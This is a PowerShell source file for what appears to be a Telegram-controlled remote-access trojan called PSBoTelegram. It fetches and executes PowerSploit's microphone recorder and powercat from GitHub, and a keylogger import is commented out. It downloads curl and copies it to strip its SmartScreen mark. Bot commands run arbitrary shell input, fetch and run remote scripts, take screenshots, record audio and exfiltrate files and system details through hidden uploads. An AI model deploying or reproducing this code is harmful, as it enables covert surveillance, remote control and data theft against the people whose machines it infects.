
################################################ Cargamos funciones de otros proyectos ########################################################################

IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
#IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger

function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}

function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }

function bot-send {

param ($photo,$file,$botkey,$chat_id)

$proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
$ruta = $env:USERPROFILE + "\appdata\local\temp\1"
$curl_zip = $ruta + "\curl_752_1.zip"
$curl = $ruta + "\" + "curl.exe"
$curl_mod = $ruta + "\" + "curl_mod.exe"
if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip")
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
[System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null

Disable-Smartscreen -File $curl -Output $curl_mod
Remove-Item $curl ; Remove-Item $curl_zip
}

if ($file -ne $null) {
$proceso = $curl_mod
$uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '}
Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden}

if ($photo -ne $null){

$proceso = $curl_mod
$uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '}
Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden

}

}

function get-info {$OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME 
$Bios = Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME 
$sheetS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME 
$sheetPU = Get-WmiObject -Class Win32_Processor -ComputerName $env:COMPUTERNAME 
$drives = Get-WmiObject -ComputerName $env:COMPUTERNAME Win32_LogicalDisk  | Where-Object {$_.DriveType -eq 3}
$pingStatus = Get-WmiObject  -Query "Select * from win32_PingStatus where Address='$env:COMPUTERNAME'  "
$IPAddress= (Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:COMPUTERNAME  | ? {$_.ipenabled}).ipaddress 
$OSRunning = $OS.caption + " " + $OS.OSArchitecture + " SP " + $OS.ServicePackMajorVersion
$NoOfProcessors=$sheetS.numberofProcessors
$name=$SheetPU|select name -First 1
$Manufacturer=$sheetS.Manufacturer
$Model=$sheetS.Model
$ProcessorName=$SheetPU|select name -First 1
$Mac = (Get-WmiObject -class Win32_NetworkAdapter -ComputerName $env:COMPUTERNAME  | ? { $_.PhysicalAdapter } ).macaddress
$date = Get-Date
$uptime = $OS.ConvertToDateTime($OS.lastbootuptime)
$sheetPUInfo = $name.Name + " & has " + $sheetPU.NumberOfCores + " Cores & the FSB is " + $sheetPU.ExtClock + " Mhz"
$sheetPULOAD = $sheetPU.LoadPercentage
$serialnumer = (Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME ).serialnumber
$RAM = (Get-WmiObject -class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME ).totalphysicalmemory / 1gb
$ram_round= [math]::Round($ram,0)
$MonitorModelo = (gwmi WmiMonitorID -ComputerName $env:COMPUTERNAME   -Namespace root\wmi | Select @{n="Model";e={[System.Text.Encoding]::ASCII.GetString($_.UserFriendlyName -ne 00)}}).model
$MonitorSerial = (gwmi WmiMonitorID -ComputerName $env:COMPUTERNAME  -Namespace root\wmi | Select @{n="Serial";e={[System.Text.Encoding]::ASCII.GetString($_.SerialNumberID -ne 00)}}).serial
$Disco_duro = $drives.Size / 1gb ; $Disco_duro = [math]::Round($Disco_duro,0) ; $Disco_duro = "$Disco_duro Gb"
$PC = New-Object psobject -Property @{ 
"Nombre" = $env:COMPUTERNAME
"Modelo Monitor" = $MonitorModelo
"Monitor Num. Serie" = $MonitorSerial
"Sistema Operativo" = $OSRunning
"Procesador" = $name.name
"Fabricante" = $Manufacturer
"Modelo" = $Model
"Num. Procesadores" = "$NoOfProcessors"
"Memoria RAM" = "$ram_round Gb"
"Direccion IP" = [string]$IPAddress[0]
"MAC" = $mac
"Numero de serie" = $serialnumer
"Disco Duro" = $Disco_duro
}
$PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
}
function public-ip {param ($botkey)
$datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json  | ConvertFrom-Json
 $resultado = New-Object psobject -Property @{"IP"= $datos_ip_publica.ip
 "Pais" = $datos_ip_publica.country
 "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pais, Ciudad}

function bot-public {param($botkey) $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}

$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat

function screen-shot {param ($botkey,$chat)

$ruta = $env:USERPROFILE + "\AppData\Local\temp\1\" + "screenshot.png"

Add-Type -AssemblyName System.Windows.Forms
$resolucion = [System.Windows.Forms.Screen]::AllScreens | Select-Object bounds
$resolucion = $resolucion -split (",")
$ancho = $resolucion[2] -replace "width="
[string]$alto = $resolucion[3] -replace "height=" ; $alto =  $alto -replace ".$" ; $alto =  $alto -replace ".$"
$ancho = [int]$ancho
$alto = [int]$alto
$horizontal = (Get-WmiObject -Class Win32_VideoController).CurrentHorizontalResolution
$vertical = (Get-WmiObject -Class Win32_VideoController).CurrentVerticalResolution
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $ancho, $alto)

function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
 }

 screenshot $bounds $ruta

bot-send -photo $ruta -botkey $botkey -chat_id $chat_id

}
function graba-audio { param ($botkey,$chat_id,$segundos)
$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
$audio = $ruta + "\" + "audio.wav"
if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
if ( (Test-Path $audio) -eq $true) {Remove-Item $audio}
Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
bot-send -file $audio -botkey $botkey -chat_id $chat_id

}


function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
 $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio"
 if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
 if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id;sleep -Seconds 2 ; exit}
 if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
 if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
 if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
 if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
 #if ($kill -eq "$true" -and $first_connect -gt 5) {break;exit}

}